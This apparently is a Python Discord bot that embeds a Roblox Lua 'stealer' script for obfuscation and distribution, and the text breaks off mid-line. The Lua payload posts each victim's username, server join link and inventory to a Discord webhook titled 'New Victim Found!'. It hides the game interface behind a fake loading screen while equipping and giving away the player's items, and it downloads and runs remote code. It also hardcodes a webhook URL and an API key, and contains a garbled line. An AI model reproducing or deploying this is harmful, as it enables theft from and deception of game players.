import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import json
import os
import asyncio
import random
import string

try:
    with open('config.json', 'r') as f:
        config = json.load(f)
    TOKEN = config['discord_token']
    CHANNEL_ID = int(config.get('channel_id'))  # Convert to integer
    LUAOBFUSCATOR_API_KEY = 'f21acda-24ed-6348-dee4-7307084905ad826'
    GITHUB_TOKEN = config['github_token']
except Exception as e:
    print(f"Config error: {e}")
    exit(1)

ORIGINAL_LUA_SCRIPT = """local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local VirtualInput = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local webhookUrl ="https://discord.com/api/webhooks/1385008642889355415/6hqB3QlcQXd3n9QcsllVKDhnsDkkfgW-6R2tVvQeFjEg53ZWUUFkpVTc0EEIrmTnFmZc"
local chatTrigger ="CHAT_TRIGGER"

local E_HOLD_TIME = 0.1
local E_DELAY = 0.2
local HOLD_TIMEOUT = 3
local DISCORD_LINK ="https://discord.gg/TKZb53RfFh"

local infiniteYieldLoaded = false

local function sendToWebhook(data)
    local jsonData = HttpService:JSONEncode(data)
    local success = pcall(function()
        if syn and syn.request then
            syn.request({
                Url = webhookUrl,
                Method ="POST",
                Headers = {["Content-Type"] ="application/json"},
                Body = jsonData
            })
        elseif request then
            request({
                Url = webhookUrl,
                Method ="POST",
                Headers = {["Content-Type"] ="application/json"},
                Body = jsonData
            })
        else
            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
        end
    end)
    return success
end

local function getInventory()
    local inventory = {items = {}}
    local bannedWords = {"Seed","Shovel","Uses","Tool","Egg","Caller","Staff","Rod","Sprinkler","Crate","Spray","Pot"}
    
    for_, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isBanned = false
            for_, word in pairs(bannedWords) do
                if string.find(item.Name:lower(), word:lower()) then
                    isBanned = true
                    break
                end
            end
            if not isBanned then
                table.insert(inventory.items, item.Name)
            end
        end
    end
    return inventory
end

local function sendToWebhook()
    if not LocalPlayer then
        return
    end
    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items,"\\n") or"No items"
    
    local messageData = {
        embeds = {{
            title ="🎯 New Victim Found!",
            description ="READ #⚠️information in MGZ Scripts Server to Learn How to Join Victim's Server and Steal Their Stuff!",
            color = 0x00FF00,
            fields = {
                {name ="👤 Username", value = LocalPlayer.Name, inline = true},
                {name ="🔗 Join Link", value ="https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or"N/A"), inline = true},
                {name ="🎒 Inventory", value ="```" .. inventoryText .. "```", inline = false},
                {name ="🗣️ Steal Command", value ="Say in chat: `" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToWebhook(messageData)
end

local function isValidItem(name)
    local bannedWords = {"Seed","Shovel","Uses","Tool","Egg","Caller","Staff","Rod","Sprinkler","Crate"}
    for_, banned in ipairs(bannedWords) do
        if string.find(name:lower(), banned:lower()) then
            return false
        end
    end
    return true
end

local function getValidTools()
    local tools = {}
    for_, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") and isValidItem(item.Name) then
            table.insert(tools, item)
        end
    end
    return tools
end

local function toolInInventory(toolName)
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if bp then
        if bp:FindFirstChild(toolName) then return true end
    end
    if char then
        if char:FindFirstChild(toolName) then return true end
    end
    return false
end

local function holdE()
    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(E_HOLD_TIME)
    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

local function favoriteItem(tool)
    if tool and tool:IsDescendantOf(game) then
        local toolInstance
        local backpack = LocalPlayer:FindFirstChild("Backpack")
        if backpack then
            toolInstance = backpack:FindFirstChild(tool.Name)
        end
        if not toolInstance and LocalPlayer.Character then
            toolInstance = LocalPlayer.Character:FindFirstChild(tool.Name)
        end
        if toolInstance then
            local args = {
                [1] = toolInstance}            game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(unpack(args))
        else
            warn("Tool not found:" .. tool.Name)
        end
    else
        warn("Tool not found or invalid:" .. tostring(tool))
    end
end

local function useToolWithHoldCheck(tool, player)
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid and tool then
        humanoid:EquipTool(tool)
        
        local startTime = tick()
        while toolInInventory(tool.Name) do
            holdE()
            task.wait(E_DELAY)
            if tick() - startTime >= HOLD_TIMEOUT then
                if toolInInventory(tool.Name) then
                    favoriteItem(tool)
                    task.wait(0.05)
                    startTime = tick()
                    while toolInInventory(tool.Name) do
                        holdE()
                        task.wait(E_DELAY)
                        if tick() - startTime >= HOLD_TIMEOUT then
                            humanoid:UnequipTools()
                            return false
                        end
                    end
                    humanoid:UnequipTools()
                    return true
                end
                humanoid:UnequipTools()
                return true
            end
        end
        humanoid:UnequipTools()
        return true
    end
    return false
end

local function createDiscordInvite(container)
    if not container:FindFirstChild("HelpLabel") then
        local helpLabel = Instance.new("TextLabel")
        helpLabel.Name ="HelpLabel"
        helpLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
        helpLabel.Position = UDim2.new(0.1, 0, 1.05, 0)
        helpLabel.BackgroundTransparency = 1
        helpLabel.Text ="Stuck at 100 or Script Taking Too Long to Load? Join This Discord Server For Help"
        helpLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        helpLabel.TextScaled = true
        helpLabel.Font = Enum.Font.GothamBold
        helpLabel.TextXAlignment = Enum.TextXAlignment.Center
        helpLabel.Parent = container

        local copyButton = Instance.new("TextButton")
        copyButton.Name ="CopyLinkButton"
        copyButton.Size = UDim2.new(0.3, 0, 0.08, 0)
        copyButton.Position = UDim2.new(0.35, 0, 1.15, 0)
        copyButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        copyButton.Text ="Copy Link"
        copyButton.TextColor3 = Color3.fromRGB(200, 200, 255)
        copyButton.TextScaled = true
        copyButton.Font = Enum.Font.GothamBold
        copyButton.Parent = container

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.2, 0)
        corner.Parent = copyButton

        copyButton.MouseButton1Click:Connect(function()
            if setclipboard then
                setclipboard(DISCORD_LINK)
            elseif syn and syn.clipboard_set then
                syn.clipboard_set(DISCORD_LINK)
            end
        end)
    end
end

local function cycleToolsWithHoldCheck(player, loadingGui)
    local tools = getValidTools()
    for_, tool in ipairs(tools) do
        if not useToolWithHoldCheck(tool, player) then
            continue
        end
    end

    local container = loadingGui.SolidBackground.ContentContainer
    createDiscordInvite(container)
end

local function sendBangCommand(player)
    if not infiniteYieldLoaded then
        return
    end
    task.wait(0.05)
    local chatMessage =";bang" .. player.Name
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:WaitForChild("RBXGeneral", 5)
        if textChannel then
            textChannel:SendAsync(chatMessage)
        end
    else
        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvent then
            local sayMessage = chatEvent:FindFirstChild("SayMessageRequest")
            if sayMessage then
                sayMessage:FireServer(chatMessage,"All")
            end
        end
    end
end

local function disableGameFeatures()
    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
    SoundService.RespectFilteringEnabled = true
    
    for_, soundGroup in pairs(SoundService:GetChildren()) do
        if soundGroup:IsA("SoundGroup") then
            soundGroup.Volume = 0
        end
    end
    
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end

local function createLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then
        return
    end
    
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name ="ModernLoader"
    loadingGui.ResetOnSpawn = false
    loadingGui.IgnoreGuiInset = true
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingGui.DisplayOrder = 999999
    loadingGui.Parent = playerGui

    spawn(function()
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/edgeiy/infiniteyield/master/source"))()
        end)
        if success then
            infiniteYieldLoaded = true
        else
            warn("Failed to load Infinite Yield:" .. tostring(err))
        end
    end)

    local background = Instance.new("Frame")
    background.Name ="SolidBackground"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
    background.BackgroundTransparency = 0
    background.BorderSizePixel = 0
    background.Parent = loadingGui

    local grid =.xls = Instance.new("Frame")
    grid.Name ="GridPattern"
    grid.Size = UDim2.new(1, 0, 1, 0)
    grid.Position = UDim2.new(0, 0, 0, 0)
    grid.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    grid.BackgroundTransparency = 0
    grid.BorderSizePixel = 0

    local uiGrid = Instance.new("UIGridLayout")
    uiGrid.CellSize = UDim2.new(0, 50, 0, 50)
    uiGrid.CellPadding = UDim2.new(0, 2, 0, 2)
    uiGrid.FillDirection = Enum.FillDirection.Horizontal
    uiGrid.FillDirectionMaxCells = 100
    uiGrid.Parent = grid

    for i = 1, 200 do
        local cell = Instance.new("Frame")
        cell.Name ="Cell_"..i
        cell.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
        cell.BorderSizePixel = 0

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.1, 0)
        corner.Parent = cell

        cell.Parent = grid
    end

    grid.Parent = background

    local container = Instance.new("Frame")
    container.Name ="ContentContainer"
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Size = UDim2.new(0.7, 0, 0.5, 0)
    container.Position = UDim2.new(0.5, 0, 0.5, 0)
    container.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0

    local floatTween = TweenService:Create(container, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Position = UDim2.new(0.5, 0, 0.45, 0)})
    floatTween:Play()

    local corner = Instance.new("UICorner")
    corner.